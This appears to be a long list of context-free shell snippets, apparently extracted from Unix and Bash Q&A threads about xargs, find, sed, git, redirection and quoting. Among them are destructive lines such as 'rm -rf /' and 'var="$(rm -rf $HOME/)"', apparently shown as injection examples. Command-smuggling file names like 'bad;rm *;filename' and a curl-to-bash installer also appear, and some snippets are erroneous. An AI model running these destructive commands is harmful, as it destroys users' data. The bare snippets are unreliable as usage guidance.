echo $i ; sleep 1
grep ^real
./timeit.sh 10 ./script
echo -e
printf -v
echo -E "$data" | wc; echo -E "$data" | grep -c $'\t'
sed -e 's/\\t/\t/g' -e 's/\\\t/\\t/g'
bind "set disable-completion on"
 /var/log/nginx/*log
 }
sed 's/^ //g'
find . -maxdepth 1 -type f -name "$1"
maxdepth 1
man 7 regex
\ls *ext.2010-09-{10,11}.Z
ls *ext.2010-09-10.Z
ls *ext.2010-09-11.Z
echo -e {1..10}"\n" |xargs -n1 some_command
echo -e {1..10}"\n" |xargs -I@ echo now I am running iteration @
sh -c
rep() { s=$1;shift;e=$1;shift; for x in `seq $s $e`; do c=${@//@/$x};sh -c "$c"; done;}
rep 3 10 echo iteration @
rep 1 10 "ls R@/|wc -l"
seq 20 | xargs -Iz echo "Hi there z"
sh -c 'command1; command2; ...'
watch -n 1 some_command
man date
cat so.txt
awk '{ print $7 }'
cut -f2 -d"="
w3m -dump
wget -O-
lynx -source
for i in $1 $2 $3
for i in $[1-$#]
"$1" "$2" ...
-x -z -f
cat -- -my-file
shift 2
for arg
screen -x
which spotify
set -x
output: filename linecount wordcount
while read
screen -x
after 500
if [ -e $ZONELOCATION/$ZONE.db ]
set -x
"Foo Bar 09.20.2010"
Foo Bar.txt
sort -n
sort -n
head -1
cut -f2- -d' '
bash -x
set -x
git describe
python myArchive.zip
python __main__.py buildProject
git send-pack
s/ /\\\\\\&/g
echo "Projects" | xargs cd
Working Branches
[ $? ]
[ -n $? ]
[$? -eq 0]
(( $? ))
example.sh 1 2 3 4 5
4 5
env time
man 1 time
diff -r dir1 dir2
diff -r dir1 dir2
diff <(du -sh dir1) <(du -sh dir2)
( )
... | sed 's/^/--prefix=/g' | xargs echo | xargs -I PARAMS your_cmd PARAMS
sed 's/^/--prefix=/g'
xargs echo
xargs -I PARAMS your_cmd PARAMS
cat input.txt | sed 's/^/--file=/g' | xargs echo | xargs -I PARAMS my-program PARAMS
brew install gsed
sudo [whatever command]
man sudoers
echo *.txt | xargs mycommand
mycommand *.txt
find ... | xargs mycommand
1000      4571  0.0  0.0  12724   868 pts/4    S+   19:21   0:00 grep --color=auto g
mv -i
info diff
info -f /usr/share/info/diff.info.gz
tail -f
/home/dave/perl5/perlbrew/bin/perlbrew switch perl-5.12.2
perlbrew switch perl-5.12.2
display -size 200x200 filename
compgen -c
:!vim %
find . -type f | xargs perl -nle '... #aka yada yada'
cat /etc/passwd
cat /etc/passwd|
cat *.txt
wc -l *.txt
wc -l {a..e}.txt
cat *.txt | wc -l
wc -l *.txt
cat *.txt | wc -l
wc -l
cat *.txt | perl '...'
perl '...'
perl '...' *.txt
cat a.txt | perl '...'
tail -f
(pid, time, cmd) = result.split(2)
man 5 proc
putenv(), setenv() and unsetenv()
extern char** environ;
read -t20 var
man ksh
read -t
-f, --canonicalize
ps -ef
watch --color ls -ahl --color
sudo apt-get install expect
git log
for r in {0..100}
for r in {0..10..2}
for z  in {a..z}
seq 0 100
for file in *.{txt,jpg}
time command
-f: command not found
\time -f '%e' command
sed -re 's/count="([^"]+)"/\1/g'
[ -n "$wtf" ]
[ -z "$wtf" ]
[[ $wtf ]]
if [ $wtf = true ] || [ ! -f . .
docker attach
docker attach --help
$ docker attach
$ docker attach --help
$ diff <(!-2 2>&1) <(!! 2>&1)
'sh autocomplete.sh'
ls $DIR
ls $DIR
sed -n -e '/\/\*\*$/,/\*\/$/p'
man printf
NR == 1
tclsh empty.tcl &
[1]+  Done                    tclsh empty.tcl
rlwrap tclsh empty.tcl &
[1]+  Stopped                 rlwrap tclsh empty.tcl
 rlwrap bash ./t.sh & 
 rlwrap bash ./t.sh \& 
rlwrap tclsh
tclsh &
rm -rf /
if $myVar; then ... ;fi
if [ "$myvar" = "true" ]
"$1" "$2" "$3"...
"$3" "$4" "$5" "$6"
echo "$*"
su: unrecognized option '--myoption'
find .. -exec
sh -c '...' sh
-n 1
-P <nr_procs>
seq 1 <number_of_arguments_to_abc>
abc alpha beta gamma
seq 1 3
for x in "$@"
in ...
for arg ; ...
for arg
for arg
bash --login -i -c 'cd /cygdrive/c/; exec bash'
bash --login -i -c 'cd /cygdrive/c/...; exec /bin/bash'
cd -
PATH=/usr/bin/:$PATH"; export PATH
cd -
( cd directory; rm files)
exit 1
exit 0
bash -x
bash -x
gnome-terminal --help-terminal-options
bash -c
bash -i
-n +1
{ }
( )
( )
{ }
set -e
if [ $? -ne 0 ];...
trap "your shell code" ERR
trap "echo script failed; exit 1" ERR
false | true
set -e
apache user
killall apache
su apache
sudo -u apache kill 11173
eval "echo \${$i[*]}"
if [ {$i[0]} = "true" ]
/some/ /some/long /some/long/path/ /some/long/path/to/ /some/long/path/to/my
eval $JAVACMD
ps -ef | grep command-name
ps -ef
echo $SECRET | command
ps aux
cat /proc/$YOUR_PROCESS_PID/cmdline
myCommand /dev/fd/67
gem install
0 * * * * command
crontab -e
ENCLOSED BY '\"'
load data local infile "
" into 
table $dbtable FIELDS TERMINATED BY ',' ENCLOSED BY '
' LINES 
TERMINATED BY "
" IGNORE 1 LINES
" '
echo 
I like to use
 
"double quotes"
 
ssh listvalue cat log.txt|awk '{print }'
words beginning with $
for blah in *.bx ; do mv ${blah} ${blah%%.bx}
Hello world
exec < /dev/stdin
echo "something" >> /dev/fd/3
echo Goodbye
cat <&3
perl -e 'open(FD,">&3"); seek(FD,0,0);'
set -o vi
man bash
time <yourscript>
/usr/local/bin/notes: line 45: /home/MY_USERNAME/notes/2010-10-01:Permission denied
list=$(cat input.txt)
git branch
$(git branch)
* master mybranch
set --
set -- "$@" %(refname)
$(git branch|grep -o "[0-9A-Za-z]\+")
git branch | grep "[^* ]+" -Eo
git branch --list | grep -v "HEAD detached" | grep "[^* ]+" -oE
git branch | tr -d ' *' | while IFS='' read -r line; do git log --oneline "$line" ^remotes/origin/master; done
git branch --all --format='%(refname:short)'
git branch --format='%(refname:short)'
git branch --remotes --format='%(refname:short)'
mapfile -t -C my_callback -c 1 < <( get_branches )
git show-ref
git show-ref --heads
awk '{ print $1 }'
echo "magic! $SHA"
git branch
export TEXTDOMAINDIR=/home/lji/locale
exit  /b 3
ssh -l admin host 'cmd /c start c:\bbb'
source  ~oracle/.bash_profile
-F '='
cat projectPaths
<( )
xargs -a /dev/fd/63 vim
lynx -dump «url» | grep "Did you mean" | awk ...
(if [ -e *.flac ];)
[: too many arguments
if ls *.flac >/dev/null 2>&1;
[ $# -gt 0 ]
if [ "$(ls -A | grep -i \\.flac\$)" ]; then echo true; fi
sudo -v
sudo -n true
set -o | grep physical
export VAR=value
systemctl edit --full asterisk.service
awk -v awkvar=$shellvar '{print awkvar}'
commands that I mentioned are examples of this. Also, your
if ! [[ -n $var ]]
[[ $var ]]
[[ ! $var ]]
if [ "$var" ]
if [ ! "$var" ]
server=(server1 server2 server3 ... server24)
for ((n=0; n <= 23 ; n++))
for ((n=0; n < 24 ; n++))
The backslash has to be the very last character before the end of line character.
1 .. 64
join ",", "a", "b", "c"
"replace this"
"replace this"
ulimit -a
sh test.sh
source ~/bin/mygoodoldscript
usb1-port 1.device 1
usb1-port 2.port 3.device 1
lsusb -v
xterm -e $my_cmd /C  &
killall xterm
man pgrep
echo r
echo $r
echo $r
echo r
ls *.jobdone | wc -l
grep -v
sed -e 's/<em\:update.*//g' install.rdf > install.rdf
sed -e 's/<em\:update.*//g' install.rdf > install.rdf
sed -e 's/<em\:update.*//g' install.rdf > install.rdf
sed -i
grep -c
$( ... )
$(( ... ))
aptitude upgrade
echo "mysql-server-5.1 mysql-server/root_password password $DB_PASSWORD" | debconf-set-selections
aptitude upgrade
var=$((echo 2^100 | bc))
var=$(echo 2^100 | bc)
set -e
sed -e 's/.mp3//g'
xargs -0 -I'file' mv file ${file%.mp3}.txt
\e]1;new tab name\a
export EC2_HOME=/home/jd/ec2
. ~/.local_bashrc
echo Hello from FILE
find ./ -maxdepth 1 -type f | while read line; do mv "$line" ~/target_dir/; echo "$line"; sleep 240; done
 find ./ -maxdepth 1 -type f
do mv "$line" ~/target_dir/;
do mv "$line*" ~/target_dir/;
find ./ -type f -printf '%f\n':
sed 's/\..*//'
sort | unique
while read filename
find . -type f -iname "$filename"'*' -exec mv {} /dest/dir \;
find .
-type f
-iname "$filename"'*'
-exec mv {} /dest/dir \;
sleep 240
-maxdepth 1
find ./ -maxdepth 1 -type f | sed -e 's/.[a-zA-Z]*$//' | uniq | while read line; do mv "$line*" ~/target_dir/; echo "$line"; sleep 240; done
sudo macaco NewFolder
/usr/bin/macaco: line 7: [: too many arguments
chmod +x
strace -f -o /tmp/trace.log
eval "$BASH_POST_RC"
gnome-terminal --working-directory="/home/zardoz/projects/my_rails_app" --tab -e 'bash -c "export BASH_POST_RC=\"rails server\"; exec bash"' --tab -e 'bash -c "export BASH_POST_RC=\"autotest\"; exec bash"'
echo "$abc" | wc -l
wc -c
find ... -print0
nslookup domain.com
hostname domain.com
dig domain.com TYPE NS
<< EOF
ssh .... ping -c 10 $hostTo | awk -v from=$host -v to=$hostTo 'END {print from, to, $0}' >> logs/${host}.log
avp.com scan
ssh -n user host
@echo off
"C:\Program Files\Kaspersky Lab\Kaspersky Anti-Virus 6.0 for Windows Servers\avp.com" %1 /i2 > NUL 2>&1
set /a error = %errorlevel%
::error in executing avp.com command
if %error% equ 9009  goto :something_error
:: Infected
if not exist %1 goto :file_not_exist
:: if error grater than zero go to label something_error otherwise [error=0] go to label valu_0
:: There is threat
if %error% equ 102 exit /b 1
:: Infected
if %error% equ 101 exit /b 2
:: Missing parameters
if %error% equ 1 exit /b 4
:: Anti-Virus application error
if %error% equ 3 exit /b 3
if %error% equ 4 exit /b 3
if %error% equ 9009 exit /b 3
:: Abnormal error
if %error% equ 2 exit /b 7
::No threat
exit /b 0
:: Infected
exit /b 2
# $1 = name of the uploaded file
if [ -f "$1" ];
scp -r /$1/ ${PRIMARY_SERVER_USERNAME}
if [ $? -eq 0 ];
ssh -l ${PRIMARY_SERVER_USERNAME}
${PRIMARY_SERVER_NAME} 'cmd /c '$SCAN_BATCH_FILE_WINDOWS' '$COPY_FILE_TO_WINDOWS_WINDOWS_FORMAT'/'$x''
scp -r /$1/ ${BACKUP_SERVER_USERNAME }
ssh -l ${BACKUP_SERVER_USERNAME}
${BACKUP_SERVER_NAME} 'cmd /c '$SCAN_BATCH_FILE_WINDOWS' '$COPY_FILE_TO_WINDOWS_WINDOWS_FO
echo "$(date +%c)       $1      error code=$error_code">> ${LOG_FILE}
exit $error_code
echo "$(date +%c)       $1      error code = 5  " >> ${LOG_FILE}
exit 5
egrep '(d|br)eath' test_file
d or br
grep -E
stat -c %s /tmp/lazyguy.log
mailx -s "Lazyguy is really lazy" alerts@main.com < /tmp/lazyguy.log
set -x
abspath ./../somefile
readlink -e FILE
absolute path
absolute path
relative path
relative path
canonical path
canonical file name
resolved path
absolute path
canonical path
canonical path
locate $filename
realpath() {ruby -e "require 'Pathname'; puts Pathname.new('$1').realpath.to_s";}
dirname "$1"
cd "$(dirname "$1")
$(basename "$1")
brew install coreutils
result=$(cd "$dir" && pwd)
result=$(cd "$dir" && pwd -P)
realpath -e
readlink -e
tail -f
b=$(echo "$QUERY_STRING" | sed -n 's/^.*b=\([^&]*\).*$/\1/p' | sed "s/%20/ /g")
echo ${QUERY_STRING//&/;}
# ...
./script.sh "test1$test2"
./script.sh test1
echo "${1}"
echo "$word" | grep -q "$letter"
[ 1 ]
echo "Linux" | grep -d "nuxi"; echo $?
grep -v log
ls -F
alias npp="/cygdrive/c/Program\ Files/Notepad++/notepad++.exe"
"C:\Program Files"
tar tf mytarball.tar --wildcards *{.tcl,.log} | grep -v pkgIndex.tcl | tar --delete -f mytarball.tar -T -
$(tput cuu 2)
$(tput cuu1)$(tput cuu1)
ln -s ~/.bashrc ~/.profile
cat eg_*
tr -d
php file.php value1,value2,value3
ls (*)
exec <scriptname>
expr + 1
exit 1
exit 1
exec <&-
exec <&-
exec >&-
exec <&-
exec </dev/tty
-bash: export:
GEM: command not found
report_activate_error': Could not find RubyGem rails (>= 0) (Gem::LoadError) from /System/Library/Frameworks/Ruby.framework/Versions/1.8/usr/lib/ruby/1.8/rubygems.rb:261:in
COMPREPLY=(aa/ba/ aa/bb/)
man bash
? :
cond && op1 || op2
[ "x$b" == "xyes" ]
int a = (b == 5) ? c : d;
[[ $b = 5 ]] && a="$c" || a="$d"
command "?" ...args
ar[any value other than 5]
LOAD DATA INFILE
"No such file ....
ARRAY=( $(ls -d */) )
Desktop/test_files/folder 1/folder 2/"folder 3"/
fix-permissions.sh user1 user2 user3
java -jar file.jar
rmdir *
IFS=$(echo -en "\b\n")
SAVEIFS=$IFS; IFS=...; do stuff; IFS=$SAVEIFS
while read;
/usr/lib/gnome-panel/gnome-panel-add --launcher=yourApp.desktop
-d -m
stat -c %a
cmd 3>&1 1>&2 2>&3 3>&-
man sh
2>&1 1>/dev/null
3>&1 1>&2 2>&3 3>&-
set -x
eval echo ...
"$(printf "~/%q" "$dangerous_path")"
echo ${~dangerous_path}
var="$(rm -rf $HOME/)"
bash ./test.sh
eval echo
echo $(eval echo ~)
eval echo ~
eval echo "~"
"echo $var"
"echo ~..."
at -h
man at
sys.scheduled_run /path/to/my/script 5
$1 ... $n
$1 ... $n
#!/bin/bash -O extdebug
shopt -s extdebug
man bash
export LC_ALL=C
grep -i null myfile.txt
total null count
man grep
grep -n -i null myfile.txt
egrep -ne 'null|three'
egrep -ne 'null|three' | less
~/.ssh/config file
$/ = "!!End"
sudo echo "Thanks."
sudo echo "Thanks"
first second third
echo $MYVARIABLE | awk 'BEGIN { RS="," }{ print $0 }'
awk 'BEGIN { FS="," ; OFS="\n" } { print $1,$2,$3 }' filename.csv
read -s
-p prompt-string
cp $file $SOME_PATH
export SOME_PATH="~/path/to/path/"
- print0
- print0
cp file /Users/com.apple.Safari.plist/Library/Preferences
cp /Files/com.apple.Safari.plist ~/Library/Preferences/
Hello World
set "abc=xyz"
export abc="xyz"
du -s -D
du -s -D | awk '{print $1}' | sed 's/%//g
du -s -D | awk '{print $1+0}'
targfiles=( $(ls -rt) )
$ date -d "2010-07-07 200 days"
date -d
history | grep [command]
ls -lt 2010*
ls -l
find . -type d
trap "... ;exit 1"
kill -9
kill -9
DROP my_temp_table
find . -type d -print0 | xargs -0 -n 1 my_command
GNU find
find .... -exec mycommand +;
#this is same as passing to xargs
shopt -s extglob
find . -maxdepth 1 -mindepth 1 -type d
for D in *; do cd "$D";
for d in */; do  cd "$d"; echo $d; cd ..; done;
for D in "$(ls -d */)"; do cd "$D"; done;
for D in "$(*/)"; do cd "$D"; done;
for D in "$(`find . -type d`)"; do cd $D; done;
for D in *; do  if [ -d "${D}" ] then cd ${D};  done;
set -o history
history -w
mkdir max{10..15}
mv foo
bind -lp
bindkey -L
vim ...
pastebin 'your message'
cat your_file.txt | pastebin
-X POST
dpkg --compare-versions <first> <relation> <second>.
expr match
sort --version-sort
return 1
1.5a < 1.5b
1.6 > 1.5b
if V 1.5 '<' 1.6; then ...
a<b or a=b
a<b or a=b
pure bash
compare_versions <ver_a> <ver_b>
cp initial.txt {foo,bar,baz}
cp initial.txt foo bar baz
$( ... )
echo "$(testfn "foo         bar")"
[ … ]
echo 1>&2 "this is an error message"
stty -echo
echo setting=value|my_prog -F -
echo setting=value
-type f
cat file.txt | sort
open("| sort", 'w') {|cmd| cmd << file}
mail -s
cat body.txt | mail -s "subject" recipient@a.com
This is a file name
This\ is\ a\ file\ name
bad;rm *;filename
bad\;rm\ \*\;filename
sort --version-sort
ls -l --sort=version
ls -l
([0-9]+\.){3}[0-9]+, )*
launchd message
launchd message
tail | while
if [[ $line == *launchd* ]]
Segmentation Fault
; rm -rf /
awk -F"'" '{for(i=2;i<=NF;i+=2) print($i)}'
set -f
set +f
A practical guide to Unix for Mac OS X users
a='abc "*" xyz'; echo $a
shopt -s extglob
cut -d ' ' -f 2
tail -f
git clone --progress <repository>
egrep -o
eval echo ...
local -n
man bash
( "$@" )
$1 >= 3
/sbin/iptables -L FORWARD -n -v -x
#s mixed with letters/words
-i -
echo ${fname}|sed -e 's/^.*\(.\)$/\1/' -e 's/[^C]/No  /' -e 's/.$/Match/'
diff file1 file2 | grep ">"
awk 'NR == FNR {file1[$0]++; next} !($0 in file1)' file1 file2
apt-get install beep
apt install beep
if test a -ne b
`which ls`
pwd | cut -f 1- -d\/ --output-delimiter=\n
-T      Disable pseudo-tty allocation
Must run as root, i.e. sudo ./scriptname
chmod 777 scriptname
su: user root does not exist
chere -i -m
cygstart --action=runas
python3 cygwin-sudo.py **yourcommand**
env USERNAME=...
/usr/bin/dos2unix <file>
vi filename.sh
:set ff=unix
bin/someapp do-action --option1 some_value --input some_file
bin/someapp do-action --option1 some_value --input $piped_in_data
command <( another_command)
curl http://rvm.io/releases/rvm-install-head | bash
<( x )
>( y )
< <()
< <()
while read ...
| grep sms_queue | grep -v grep
kill -9 $PID
ls ~/docs > filenames.txt
time ./myprog
ls -al myPipe
ls -l
: OK
echo hello world
myscript pax
-d "/home/$DIR"
apt-get install
set -e
tr -d ' '
echo $PWD
bind -p
help bind
pwd | xsel -b
echo $(basename $PWD)
svn ci
-n +N
ls -t
tail -n +6
ls -t
head -n 5
wc -c yourimg.png
ps e
cat file
cat file | decoding software
man bash
git pull --ff-only
git pull --rebase
git pull
echo "Hello World"|logger -p local1.alert
2010-11-09T15:40:11.516811-06:00 here logger: Hello World
2010-11-09T15:40:11.516811-06:00 there logger: Hello World
VAR="foo bar"
foo bar
files['1500000704'] = 'SH103239'
$ cat > a.txt
$ echo content > filename
du -sb $FOLDER/* | sort -n | sed "s#^[0-9]*##" | sed "s#^[^\./]*##" | xargs -L 1 du -sh | sed "s|$FOLDER||";
find . -type d -exec du -ch {} \;
find . -type d -exec du -ch {} +
cat text.txt | cut -d " " -f 4
awk '{ printf $4; }'
sed  -E "s/[[:space:]]+/ /g"
tr -s
([^ ]*[ ]*){3}
echo -n
require_once 'bootstrap.php';
tab 1 of window 2835
do script
do script
java -jar file.jar
kill -INT PID
java -jar file.jar &
kill -INT
sh bsq
stat -c %Z filename
stat -c %Y filename
if [ $file -ot $timestamp_file ]
touch -t "$(date -v -1m +%Y%m%d%H%M)" ${DATEFILE}
if [ ${SERVERFILE} -ot ${DATEFILE} ]
sh Trash.sh
sh Trash.sh -a
foo *
"file name.txt"
ls -b
for ARG in "$@"
for ARG
VAR="foo bar baz"
VAR=("foo" "bar" "baz"
find ~/dustbin -name "$file"
time sh -c "dd if=/dev/zero of=ddfile bs=512 count=125 && sync"
gawk 'NF != 6 && /\\$/' file
java -jar theJar.jar
java -jar ...
start=$(my_prog|awk ...)
my_array=($(my_prog|awk ...))
< <()
ulimit -m
| pv |
yes | tr \\n x | head -c BYTES | tail
dd if=/dev/zero bs=1G of=/dev/null
head -c $((1024*1024*50))
`head -n7 mkdoc|tail -n1`
mv nutzer.1.gz ~/public_html/man/man1/
echo -n
[ "$eof" == true ]
grep .
grep ""
chwon root.www wrapper; chmod 4440 wrapper
Hello: world
| less
less -F
less -F
fsi /?
mono /.../fsi.exe --load:load-gtk.fsx
find $PWD
find ~+
readlink -f relative_file_name
readlink -e
realpath -s
touch foo/bar
readlink foo
realpath -s foo
realpath -s foo
(cd <path>; pwd)
dirname "$1"
cd "$(dirname "$1")
$(basename "$1")
"$(pwd)/$(basename "$1")"
readlink -f
$ foo -ax --long-key val -b -y SOME FILE NAMES
e" in order to enter the character "è", or "
2010-11-15 04:02:38
"Hello World"
echo "$c"
" World"
foo = "$fooWorld"
(( ))
$(( ))
man bash
tr : "\n"
paste -s -d ':\n' file
sed 's/a/e/g' test.txt > test.txt
sed 's/a/e/g' test.txt | tee -a >/dev/null test.txt
alias stee="tee >/dev/null"
kill %1
man bash
man bash
/JOB CONTROL
ps aux
kill -9 <PROCESSID>
mv * ...
cp * ...
command not found
modprobe -a $modulename
modprobe -a $modulename
[ -d /run/media/$USER/USB_STICK ] && do_stuff
1 row in set (0.00 sec)
5 rows in set (0.00 sec)
--show-warnings --i-am-a-dummy
sort -u
git fsck --full
git status
git status
zsh -x 2> zshdebug.log
-n nchars
echo $_
echo $BASH_COMMAND
man bash
date -d "2010-10-01 12:34:56"
date -d "20100101123456"
2010-11-06 21:32:45
Quoting multiple sed lines in the Bourne shell
`ls epi1_mcf_0*.nii.gz`
`` `ls epi1_mcf_0*.nii.gz` ``
ls --color
ls --color=auto
man ls
echo "foobar"
bind '"\002":"echo command"'
bind '"\002":"echo command\015"'
$(date ...)
[ -d ... ]
git archive
git archive --worktree-attributes
php urlcheck.php LINE_FROM_urls.txt
sudo crontab
ps | grep
grep -Eq
grep -E
tail +1119 ~/.bash_history | head -1 | sed -e "s/20101115/20101118/g"
history | tail +1119 | head -1 | awk -F"  "  '{print $3 $4}' | sed -e "s/$OLD/$NEW/g"
xargs -I {}
hg add %1
/Library/Contextual Menu Items/
Run shell script
Pass input
As arguments
hg add $1
File menu->Save as a Plugin
plugin for Finder
files or folders
as arguments
sort -f" " -s -k 2,2
nm `which who`
man -k
export JBOSS_HOME="$JBOSS_HOME"
rm -f /path/to/jboss/server/*.log
rm -f \$JBOSS_SERVER/log/*.log
return 0
bash -x
set -x
bash -x
-o tls=yes
-o username=...
-o password=...
a nice day
"a nice day"
'a nice day'
echo result: '$cnt'
matlab ...
echo $1 >> /tmp/values
rm /tmp/values
NODES * PROCS_PER_NODE
mono your.exe
update-binfmts --display
-compress jpeg
ls --help
sort -V
man wget
Content-Type: application/octet-stream
sed -n "/$fd/,/$boundary/p"
sed '1,/^$/d'
sed '$d'
killall Finder
AppleScript Editor
if not
for ...; do ...; done
for ...; do ...; od
chmod +x perlStemmer.pl
export PATH=$PATH:.
ls $DIR/*
Tortoise Git --> settings --> remote
ls -l 2>&1 >&3 3>&-
ls -l
sort -u
grep --perl-regexp
man sed
sed -i -e ...
sed -i'' -e ...
sed -i '' -e ...
perl -i -pe's/old_link/new_link/g' *
sudo port install gsed
sed -i 's/old_link/new_link/g' *
chmod 755
fvi mysort
fvi mysort
cd /usr/bin
sort | uniq
sort -u
sed 's|\r$||'
netstat -tlnp | grep <port> for Linux
... | awk '{print $7;}'| sed 's/\// /g'
netstat -p
find /Users/ptomblin/Shared/ ...
find .
chmod +x *.sh
chmod +x -R *
chmod +x -R *.sh
find . -name "*.sh" -exec chmod +x {} +
-exec command {} +
for infile in *.*
set -x
exec bash --init-file "/etc/profile;~/.bashrc;${myInit}"
sed: 1: "/Nov 22, 2010/,": expected context address
"[] []"
set +x
print bashCommand
subprocess.run(..., check=True, stdout=subprocess.PIPE).stdout
subprocess.run(..., check=True)
"the shell"
for file in os.listdir('.'): if not file.endswith('.png'): continue
cd "$HOME"
grep 'foo' <inputfile >outputfile
echo foo | nl
ls -l /
'ls' '-l' '/'
subprocess.run(['echo', 'bar'])
> test.nt
> test.nt
backsticks works
python_ret=$(python b.py)
exec 3>&-
brew install coreutils
exec bash --init-file <(cat /etc/profile ~/.bashrc $ANOTHER_SCRIPT) -i
exec bash --init-file <(cat /etc/profile ~/.bashrc $ANOTHER_SCRIPT; echo "PS1='[TEST] '$PS1") -i
PS1="[TEST] $PS1"
<(cat ...)
gnome-terminal --geometry=130x25+20+525
gnome-terminal -x sh -c "ls|less"
man pgrep
pgrep -f test-app.jar
kill -TERM scriptpid
kill -TERM -$PARENT_PID
./fastcgi_bin || exit -1
perldoc perlipc
./fastcgi_bin 0<&0 &
script [source] [destination]
[[ -t 1 ]]
man ps
perl find_dups.pl input.css
grep --color
ls --color
myCommand 2>&1|c
myCommand | c
w myCommand
#: /bin/sh
ls -p
(ls -p XXX | grep / >/dev/null)
find -exec
unzip -l |awk
unzip -l
xterm -e 'program to be run'
filename; rm -rf /
rm -rf /
unzip '*.zip'
7z x "*.7z"
matlab -nodesktop
screen -X ...
[["$s1" == "$s2"]]
( )
bash filename.bash
sh filename.sh
pik info | grep -e '^version:.*'
interpreter-version: "
<< EOF
df -i
const char *
char *
echo "GET /files/a_file.mp3 HTTP/1.0" | nc -w 5 192.168.0.2 999  > /tmp/the_file.mp3
-w 5
cat request.txt | nc -w 5 192.168.0.2 999  > /tmp/the_file.mp3
if 'optionKeyDown'; then open "$WORKDIR/../Resources/config.app"
keys option
read -d, x y < <(echo a,b,)
read x y < <(echo a b)
12,22.45,"Hello, ""man"".","A, b.",42
printf "%q"
shoutout 'Hello'
erl -s module_name function_name
][1] shows all the command line options, but [
erl -run
erl -s
erl -eval
read -p "Please Enter a Message:
" message
man bash
su - username
shopt -s huponexit
unzip -j
patch -p#
unzip -l
-mtime -1
mv incoming/* processing/
for f in *.s
done < "$f"
done < <(cat *.s)
for f
ls -al
man date
wget -m -p http://www.example.com/example.html
base=$PWD; for num in *; do cd $base/$num; cp /home/files/*Session${num}.* .; svn add *Session${num}.*; svn commit; done
read -s
\b \b
stty -echo
for file in ./**/*.java; do ...
rm *
export LANG="pl_PL.UTF-8"
grep -x
ls | grep -x
find . -type l -name link1
find . -lname '*test*'
echo $line
ssh remote tail -f
export -f
-exec command {} +
bash -c
bash -c
'echo "$@"'
_ {}
bash -c 'shell_function "$0" "$@"'
-printf "%P\n"
sort -g
sudo rm -r
find . | grep -v "excluded files criteria" | xargs rm
-type f
find | xargs
rm *
rm -r *
find . -type f -not -name '*ignore1' -o -not -name '*ignore2' | xargs rm
Virtualbox\ VMs
Virtualbox VMs
rm $OLD_FILES
shopt -s nullglob
echo *.sh *.bash
zip -FI MyZipFile /dev/fd/1 /dev/fd/3
rvm -v
if ((counter > max))
set -m
echo "${RED}this is red ${NORMAL}this is normal"
OSC 10
OSC 10
OSC 4
OSC 4
cd winhome
" "
mount --help
cygpath --mydocs
cygpath --help
bash -x
set -x
ps $pid
./program < input.txt
[your program]
mv cc1.txt control4 ; mv cc2.txt control8 ; mv cc3.txt control16
function foo() { ... }
Runtime.getRuntime().exec("sh shellscript.sh");
diff -r -q dir1/ dir2/
PHP solution
split --help
xargs -a /dev/null --show-limits
echo 'file_1.gz'|sed -n 's/.*_\(.*\)\(\.gz\)?/\1/p'
echo 'file_1.gz?'|sed -n 's/.*_\(.*\)\(\.gz\)?/\1/p'
echo 'file_1.gz'|sed -n 's/.*_\([0-9]*\).*/\1/p'
ls -R
-type f
shopt -s globstar
shopt -s dotglob
setopt dotglob
set -o globstar
date -d @nnn
2020-11-07 00:00:00
2020-11-07 01:00:00
5 minutes
cd $HOME/ivy/bin
for i in $@; do ...; done
man paste
make -C /usr/src/linux help
make all install modules_install
cp -f
mv -f
mv --help
cp --help
6/19/2010 16:04:43
;6/19/2010 16:04:43
cat file | sed 's#[0-9]\{1,2\}/[0-9]\{1,2\}/[0-9]\{4\} #;&#g' >resultfile
java <myjar.jar> file$i
tar cf pipe $directory_name
echo -n
(if terminal_supports > 256)
man read
grep $kind stock.txt
trap "" HUP
nohup yourscript.sh &
kill -9
File created
source /etc/profile
sed -f
diff myfile.bak myfile
set -e
command-that-may-fail || true
set -e
set +e
set -e
system(bin/someapp do-action --option1 some_value --input $piped_in_data)
bin/someapp do-action --option1 some_value --input some_file
awk '$3 == "0" && $4 == "yes" { print; }' myfile
grep '............................0........yes' myfile
find . -perm -g-r
find . -perm -g+r
-perm -g-r
-perm -g-r
find . ! -perm -g+r
echo -e
"$(cmd ..."$var")"
return true
return false
echo "Hello World!"
set -o history
set +o history
HISTFILESIZE' also in the user's startup file (e.g.
set -x
$$key = $val
"${#A[@]}" - 1
echo "abcd MATCH1 STRING MATCH2 efgh MATCH1 ijk MATCH2 MATCH2 lmnop MATCH1" | sed...
MATCH1 == MATCH2
-p 0
/path/to/staging repo
git pull
/path/to/staging (bare)
user : root
user : dev1
user : dev1
git pull
user : root
sudo -u webside-user-name 'cd /live/website && git fetch && git checkout master'
iso2int 5MB
units -t '5MB' 'bytes
sed -e 's/b//i;s/k/*1000/i;s/m/*1000000/i;s/g/*1000000000/i;s/t/*1000000000000/i' | bc
man paste
paste -d ' ' file1 file2 file3
./myscript -n 1034596
./myscript -v AB_ABCD_12345
./myscript 1034596
man bindkey
/search string
man zsh
man zshall
man bash
man zshbuiltins
man zshzle
man zshcontrib
run-help bindkey
run-help history
autoload run-help
alias run-help=man
man zshcontrib
zsh --version
autoload -Uz help
man ... zshall
help math
help complet
help glob
help arrays
help env
help except
help --
read -
$ source .zshrc
. ~/.zshrc
run-help bindkey
man zshcontrib
man zshall
sudo ls
/usr/share/zsh/functions/Misc/run-help sudo ls
autoload -Uz run-help-sudo
man zshbuiltins
zsh --version
man zshbuiltins | less -p bindkey
See the section 'Zle Builtins' in zshzle(1).
man 1 zshzle | less -p bindkey
bindkey can be used to manipulate keymap names
25 - ${#string1}
25 - ${#string1} - ${#string2}
printf '\055%.0s' {1..40}
"$PROC_NAME ..."
| head -c 40
create-console-spanner "loading graphics module" "[success]"
paint-format "&red;This is %s\n" red
paint-format "&bold;%s!\n" WOW
paint-span "hello " . " &blue;world"
hello ............................. world
variable=$(a | few | commands; [[ ${PIPESTATUS[*]} == "0 0 0" ]])
(exit ${r_code[2]})
| while read
head -c 10
{ ...;}
25 50 44 46
echo -n
rm -rf
-exec rm -rvf \{} \;
\)' matches directories you want to skip entirely (ie: prune). The standard pattern for using
is to say what you want to prune out, then
-wholename '*/public_html/outdated' -type d
-type d
declare -f
bash -c
sed -n
PDP-8 Introduction To Programming (Volume 1)
head *.txt | less
python /path/to/the/file.py
sed -e 's/ [a-zA-Z0-9] / /g'
for (i=1; i<=NF; i++)
s=(length($i)>2? s($i)FS : s)
print s
ps ax | wc -l
declare -i x
declare -r x
man bash
return [n]
exit [n]
return 0
exit N
return N
. script.sh
| sed -r 's/\s*(.*?)\s*$/\1/'
jobs -l
help disown
exec <&-
ls -la
-I regexp
